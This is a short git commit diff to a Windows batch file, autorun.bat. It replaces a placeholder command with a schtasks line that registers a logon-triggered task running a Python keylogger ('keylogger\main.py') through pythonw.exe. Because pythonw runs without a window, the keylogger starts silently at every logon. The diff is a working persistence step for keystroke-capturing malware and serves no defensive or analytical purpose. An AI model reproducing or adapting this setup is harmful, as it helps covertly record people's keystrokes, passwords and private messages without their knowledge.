edbb1d98c7089eab75752b78683657150a798602
henrycsharp <151407721+Henrycsharp@users.noreply.github.com>
2025-03-09 20:51:24 +0100

    Update autorun.bat

--- autorun.bat
+++ autorun.bat
@@ -1,2 +1,1 @@
-schtasks /create /tn "MyPythonScript" /tr "pythonw.exe C:\path\to\your\script.py" /sc onlogon /f
-echo %autorun created%
+schtasks /create /tn "MyPythonScript" /tr "pythonw.exe C:\Users\%USERNAME%\keylogger\main.py" /sc onlogon /f
